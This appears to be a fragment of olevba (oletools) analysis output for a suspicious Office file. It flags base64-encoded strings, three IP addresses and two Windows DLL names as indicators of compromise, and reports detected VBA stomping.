|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |212.19.17.57        |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

